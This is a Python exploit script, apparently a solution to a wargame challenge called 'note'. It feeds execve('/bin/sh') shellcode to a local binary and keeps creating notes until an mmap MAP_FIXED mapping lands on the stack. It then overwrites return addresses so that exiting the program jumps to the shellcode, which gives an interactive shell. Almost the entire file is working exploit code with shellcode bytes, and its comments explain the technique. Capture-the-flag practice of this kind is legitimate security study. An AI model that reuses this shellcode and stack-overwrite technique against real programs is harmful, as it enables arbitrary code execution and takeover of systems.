import subprocess
import time
import sys
import struct
import fcntl
import os

def read_until(word):
    data = ''
    letterIndex = 0
    letter = word[0]
    while word != data:
        character = p.stdout.read(1)
        #sys.stdout.write(character)
        if character == letter:
            data+=character
            letterIndex+=1
            if letterIndex < len(word):
                letter = word[letterIndex]
        else:
            data = ''
            letterIndex = 0
            letter = word[letterIndex]


p = subprocess.Popen(['/home/raw/Documents/pwnable/rookis/note/note'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)


shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

print '[+] wait 10 sec...'

time.sleep(10)

# store shellcode at mapped address
read_until('exit\n')
p.stdin.write('1\n')
read_until('[')
shellcode_address = int(p.stdout.readline().split(']')[0], 16)
print '[+] shellcode at ' + hex(shellcode_address)
read_until('exit\n')
p.stdin.write('2\n')
read_until('no?\n')
p.stdin.write('0\n')
read_until('byte)\n')
p.stdin.write(shellcode + '\n')
read_until('exit\n')


# vulnerability is using MAP_FIXED parameter at random address
# will skip heap/text area due to OR operation with 0x80000000
# BUT stack area not protected so keep mapping until a map overwrites
# stack area (pre-determined because ASLR is turned off) this is also easier
# because select_menu is recursivly called increasing the stack size each time
# once a area on the stack is mapped (mmap will overwrite with zeros) we will
# overwrite the return address for the stack frame with our shellcode
found_mapping = False
first_frame = 0xffffd298 # gonna be different in gdb vs shell
stack_limit = 0x000f0000
stack_frame_size = 1072
current_ebp = first_frame - stack_frame_size*2

print '[+] looking for mapping'
while(not(found_mapping)):
    # Create notes looking for stack mapped address
    for i in range(0,255):
        time.sleep(0.001)
        p.stdin.write('1\n')
        read_until('no ')
        note_no = int(p.stdout.readline())
        read_until('[')
        mapped_address = int(p.stdout.readline().split(']')[0], 16)
        read_until('exit\n')
        current_ebp -= stack_frame_size
        #print 'address -> ' + hex(mapped_address)
        #print 'note no -> ' + str(note_no)
        if (mapped_address < first_frame) and ((mapped_address > (first_frame - stack_limit)) or (mapped_address > current_ebp)):
            #print 'Mapped at stack!'
            print '[+] mapped address -> ' + hex(mapped_address)
            print '[+] note no -> ' + str(note_no)
            found_mapping = True
            break

    if(not(found_mapping)):
        # exhausted note creation, delete notes and start again
        for i in range(1,256):
            time.sleep(0.001)
            p.stdin.write('4\n')
            read_until('no?\n')
            p.stdin.write(str(i)+'\n')
            read_until('exit\n')
            current_ebp -= stack_frame_size
            #print 'note {0} deleted'.format(i)


# now ensure stack has grown large enough to include the found mapped value
# if not just keep calling select_menu to increase stack size untill it crosses over
while(current_ebp > mapped_address):
    p.stdin.write('3\n')
    read_until('no?\n')
    p.stdin.write(str(note_no) + '\n')
    read_until('exit\n')
    current_ebp -= stack_frame_size


print 'current ebp ->' + hex(current_ebp)

# find first stack frame below mapped address
temp_ebp = current_ebp
while(temp_ebp < mapped_address):
    temp_ebp += stack_frame_size


print 'temp ebp ->' + hex(temp_ebp)
diff_from_mapping = temp_ebp - mapped_address + 4


# now overwrite return pointer on stack frame where we mapped earlier
p.stdin.write('2\n')
read_until('no?\n')
p.stdin.write(str(note_no) + '\n')
read_until('byte)\n')
#p.stdin.write('A'*diff_from_mapping + struct.pack('<I', shellcode_address) + '\n')
p.stdin.write('A'*(diff_from_mapping%4) + struct.pack('<I', shellcode_address)*(1024 - diff_from_mapping%4) + '\n')
read_until('exit\n')


# now call exit and it will collapse all the stacks eventually returning to our shellcode
p.stdin.write('5\n')
read_until('bye\n')

print 'Heres your shell...'

fd = p.stdout.fileno()
fl = fcntl.fcntl(fd, fcntl.F_GETFL)
fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

while(True):
    try:
        time.sleep(0.1)
        sys.stdout.write(p.stdout.read(512))
    except:
        p.stdin.write(raw_input() + '\n')





